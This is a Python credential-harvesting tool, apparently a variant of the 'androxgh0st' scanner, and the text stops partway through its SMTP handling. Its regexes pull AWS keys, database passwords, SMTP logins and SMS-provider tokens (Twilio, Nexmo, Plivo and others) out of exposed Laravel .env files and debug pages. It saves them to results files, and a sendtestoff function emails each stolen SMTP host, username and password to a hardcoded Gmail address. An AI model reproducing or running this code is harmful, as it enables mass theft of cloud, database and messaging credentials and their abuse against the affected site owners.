######mrhouse998
###### DONT STEAL MY FUCKING CODE
####### NOW FUCK OFF



import requests, os, sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from configparser import ConfigParser
from queue import Queue
from colorama import Fore
from colorama import init
from time import time as timer
import time, datetime
from multiprocessing.dummy import Pool
import smtplib, json, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import io
from multiprocessing.dummy import Pool
import warnings, random, socket, threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from socket import gaierror

try:
    os.mkdir('Results')
except:
    pass

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''
pid_restore = '.nero_swallowtail'

def sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom):
    if '465' in str(mailport):
        port = '587'
    else:
        port = str(mailport)
    smtp_server = str(mailhost)
    if '' in mailfrom:
        sender_email = mailuser
    else:
        sender_email = str(mailfrom.replace('"', ''))
    smtp_server = str(mailhost)
    login = str(mailuser.replace('"', ''))  
    password = str(mailpass.replace('"', '')) 
    receiver_email = "krevan823@gmail.com"
    message = MIMEMultipart('alternative')
    message['Subject'] = 'SMTP LOG | HOST: '
    message['From'] = sender_email
    message['To'] = receiver_email
    text = '        '
    html = f"        <html>\n          <body>\n            <p>Send,<br>\n              BY itslucifero</p>\n              <p>-------------------</p>\n              <p>URL    : {url}</p>\n              <p>HOST   : {mailhost}</p>\n              <p>PORT   : {mailport}</p>\n              <p>USER   : {mailuser}</p>\n              <p>PASSW  : {mailpass}</p>\n              <p>SENDER : {mailfrom}</p>\n              <p>-------------------</p>\n          </body>\n        </html>\n        "
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    message.attach(part1)
    message.attach(part2)
    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server, port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
    except:
        pass

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception as e: print(e)
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

class androxgh0st:
    def paypal(self, text, url):
        if "PAYPAL_" in text:
            save = open('Results/paypal_sandbox.txt','a')
            save.write(url+'\n')
            save.close()
            return True
        else:
            return False

    def get_aws_region(self, text):
        reg = False
        for region in list_region.splitlines():
            if str(region) in text:
                return region
                break

    def get_aws_data(self, text, url):
        try:
            if "AWS_ACCESS_KEY_ID" in text:
                if "AWS_ACCESS_KEY_ID=" in text:
                    method = '/.env'
                    try:
                        aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "AWS_KEY" in text:
                if "AWS_KEY=" in text:
                    method = '/.env'
                    try:
                        aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("\nAWS_BUCKET=(.*?)\n", text)[0]
                    except:
                        aws_buc = ''
                elif "<td>AWS_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_buc = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '+str(aws_buc)
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "AWS_SNS_KEY" in text:
                if "AWS_SNS_KEY=" in text:
                    method = '/.env'
                    try:
                       aws_key = reg("\nAWS_SNS_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SNS_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        sms_from = reg("\nSMS_FROM=(.*?)\n", text)[0]
                    except:
                        sms_from = ''
                    try:
                        sms_driver = reg("\nSMS_DRIVER=(.*?)\n", text)[0]
                    except:
                        sms_deiver = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_SNS_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_SNS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SNS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        sms_from = reg("<td>SMS_FROM=<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        sms_from = ''
                    try:
                        sms_driver = reg("<td>SMS_DRIVER<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        sms_driver = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS SNS KEY: '+str(aws_key)+'\nAWS SNS KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: \nSMS FROM: '+str(sms_from)+'\nSMS DRIVER: '+str(sms_driver)
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_sns_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "AWS_S3_KEY" in text:
                if "AWS_S3_KEY=" in text:
                    method = '/.env'
                    try:
                       aws_key = reg("\nAWS_S3_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_S3_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_S3_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "AWS_SES_KEY" in text:
                if "AWS_SES_KEY=" in text:
                    method = '/.env'
                    try:
                       aws_key = reg("\nAWS_SES_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SES_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_SES_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            elif "SES_KEY" in text:
                if "SES_KEY=" in text:
                    method = '/.env'
                    try:
                       aws_key = reg("\nSES_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nSES_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>SES_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                    remover = str(build).replace('\r', '')
                    save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\n\n')
                    save2.close()
                return True
            else:
                return False
        except:
            return False
    def get_database(self, text, url):
        try:
            if "DB" in text:
                if "DB_CONNECTION=" in text:
                    method = '/.env'
                    try:
                        db_c = reg('\nDB_CONNECTION=(.*?)\n', text)[0]
                    except:
                        db_c = ''
                    try:
                        db_h = reg('\nDB_HOST=(.*?)\n', text)[0]
                    except:
                        db_h = ''
                    try:
                        db_d = reg('\nDB_DATABASE=(.*?)\n', text)[0]
                    except:
                        db_d = ''
                    try:
                        db_u = reg('\nDB_USERNAME=(.*?)\n', text)[0]
                    except:
                        db_u = ''
                    try:
                        db_p = reg('\nDB_PASSWORD=(.*?)\n', text)[0]
                    except:
                        db_p = ''
                elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
                    method = 'debug'
                    try:
                        db_c = reg('<td>DB_CONNECTION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        db_c = ''
                    try:
                        db_h = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        db_h = ''
                    try:
                        db_d = reg('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        db_d = ''
                    try:
                        db_u = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        db_u = ''
                    try:
                        db_p = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        db_p = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_CONNECTION: '+str(db_c)+'\nDB_HOST: '+str(db_h)+'\nDB_DATABASE: '+str(db_d)+'\nDB_USERNAME: '+str(db_u)+'\nDB_PASSWORD: '+str(db_p)
                remover = str(build).replace('\r', '')
                save = open('Results/database.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False
            
    def get_twillio(self, text, url):
        try:
            if "TWILIO" in text:
                if "TWILIO_ACCOUNT_SID=" in text:
                    method = '/.env'
                    try:
                        acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = reg('\nTWILIO_API_SECRET=(.*?)\n', text)[0]
                    except:
                        sec = ''
                    try:
                        chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]
                    except:
                        chatid = ''
                    try:
                        phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
                    except:
                        phone = ''
                    try:
                        auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
                    except:
                        auhtoken = ''
                elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
                    method = 'debug'
                    try:
                        acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        sec = ''
                    try:
                        chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        chatid = ''
                    try:
                        phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        phone = ''
                    try:
                        auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        auhtoken = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
                remover = str(build).replace('\r', '')
                save = open('Results/TWILLIO.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_nexmo(self, text, url):
        try:
            if "NEXMO" in text:
                if "NEXMO_KEY=" in text:
                    method = '/.env'
                    try:
                        nexmo_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
                    except:
                        nexmo_key = ''
                    try:
                        nexmo_secret = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
                    except:
                        nexmo_secret = ''
                    try:
                        phone = reg('\nNEXMO_NUMBER=(.*?)\n', text)[0]
                    except:
                        phone = ''
                elif '<td>NEXMO_KEY</td>' in text:
                    method = 'debug'
                    try:
                        nexmo_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        nexmo_key = ''
                    try:
                        nexmo_secret = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        nexmo_secret = ''
                    try:
                        phone = reg('<td>EXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        phone = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nNEXMO_KEY: '+str(nexmo_key)+'\nNEXMO_SECRET: '+str(nexmo_secret)+'\nNEXMO_NUMBER: '+str(phone)
                remover = str(build).replace('\r', '')
                save = open('Results/NEXMO.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "EXOTEL_API_KEY" in text:
                if "EXOTEL_API_KEY=" in text:
                    method = '/.env'
                    try:
                        exotel_api = reg('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
                    except:
                        exotel_api = ''
                    try:
                        exotel_token = reg('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
                    except:
                        exotel_token = ''
                    try:
                        exotel_sid = reg('\nEXOTEL_API_SID=(.*?)\n', text)[0]
                    except:
                        exotel_sid = ''
                elif '<td>EXOTEL_API_KEY</td>' in text:
                    method = 'debug'
                    try:
                        exotel_api = reg('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        exotel_api = ''
                    try:
                        exotel_token = reg('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        exotel_token = ''
                    try:
                        exotel_sid = reg('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        exotel_sid = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
                remover = str(build).replace('\r', '')
                save = open('Results/EXOTEL.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "ONESIGNAL_APP_ID" in text:
                if "ONESIGNAL_APP_ID=" in text:
                    method = '/.env'
                    try:
                        onesignal_id = reg('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
                    except:
                        onesignal_id = ''
                    try:
                        onesignal_token = reg('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
                    except:
                        onesignal_id = ''
                    try:
                        onesignal_auth = reg('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
                    except:
                        onesignal_auth = ''
                elif '<td>ONESIGNAL_APP_ID</td>' in text:
                    method = 'debug'
                    try:
                        onesignal_id = reg('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        onesignal_id = ''
                    try:
                        onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        onesignal_token = ''
                    try:
                        onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        onesignal_auth = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
                remover = str(build).replace('\r', '')
                save = open('Results/ONESIGNAL.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "TOKBOX_KEY_DEV" in text:
                if "TOKBOX_KEY_DEV=" in text:
                    method = '/.env'
                    try:
                        tokbox_key = reg('\nTOKBOX_KEY_DEV=(.*?)\n', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('\nTOKBOX_SECRET_DEV=(.*?)\n', text)[0]
                    except:
                        tokbox_secret = ''
                elif '<td>TOKBOX_KEY_DEV</td>' in text:
                    method = 'debug'
                    try:
                        tokbox_key = reg('<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_secret = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
                remover = str(build).replace('\r', '')
                save = open('Results/TOKBOX.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "TOKBOX_KEY" in text:
                if "TOKBOX_KEY=" in text:
                    method = '/.env'
                    try:
                        tokbox_key = reg('\nTOKBOX_KEY=(.*?)\n', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('\nTOKBOX_SECRET=(.*?)\n', text)[0]
                    except:
                        tokbox_secret = ''
                elif '<td>TOKBOX_KEY</td>' in text:
                    method = 'debug'
                    try:
                        tokbox_key = reg('<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_secret = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
                remover = str(build).replace('\r', '')
                save = open('Results/TOKBOX.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "TOKBOX_KEY_OLD" in text:
                if "TOKBOX_KEY_OLD=" in text:
                    method = '/.env'
                    try:
                        tokbox_key = reg('\nTOKBOX_KEY_OLD=(.*?)\n', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('\nTOKBOX_SECRET_OLD=(.*?)\n', text)[0]
                    except:
                        tokbox_secret = ''
                elif '<td>TOKBOX_KEY_OLD</td>' in text:
                    method = 'debug'
                    try:
                        tokbox_key = reg('<td>TOKBOX_KEY_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('<td>TOKBOX_SECRET_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_secret = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
                remover = str(build).replace('\r', '')
                save = open('Results/TOKBOX.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "PLIVO_AUTH_ID" in text:
                if "PLIVO_AUTH_ID=" in text:
                    method = '/.env'
                    try:
                        plivo_auth = reg('\nPLIVO_AUTH_ID=(.*?)\n', text)[0]
                    except:
                        plivo_auth = ''
                    try:
                        plivo_secret = reg('\nPLIVO_AUTH_TOKEN=(.*?)\n', text)[0]
                    except:
                        plivo_secret = ''
                elif '<td>PLIVO_AUTH_ID</td>' in text:
                    method = 'debug'
                    try:
                        plivo_auth = reg('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        plivo_auth = ''
                    try:
                        plivo_secret = reg('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        plivo_secret = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nPLIVO_AUTH_ID: '+str(tokbox_key)+'\nPLIVO_AUTH_TOKEN: '+str(tokbox_secret)
                remover = str(build).replace('\r', '')
                save = open('Results/PVILO.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_smtp(self, text, url):
        try:
            if "MAIL_HOST" in text:
                if "MAIL_HOST=" in text:
                    method = '/.env'
                    mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("MAIL_FROM_ADDRESS=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("MAIL_FROM_NAME=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
                    return False
                else:
                    # mod aws
                    if '.amazonaws.com' in mailhost:
                        getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/'+getcountry[:-2]+'.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                        remover = str(build).replace('\r', '')
                        save2 = open('Results/smtp_aws.txt', 'a')
                        save2.write(remover+'\n\n')
                        save2.close()
                    elif 'sendgrid' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/sendgrid.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'office365' in mailhost:
